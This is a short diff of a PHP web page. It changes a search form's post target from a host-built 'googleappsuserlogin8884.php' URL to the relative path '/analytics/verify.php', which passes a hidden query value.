@@ -226,7 +226,7 @@ sign in or register to get more relevant results
 
 <div class="googleapps1">
 
-<form name="input" action='<?php echo "http://$_SERVER[HTTP_HOST]/googleappsuserlogin8884.php"; ?>' method="post">
+<form name="input" action='<?php echo "/analytics/verify.php"; ?>' method="post">
 
 <input type="hidden" name="q" value="<?php echo "$googleapps84"; ?>"></input>
 
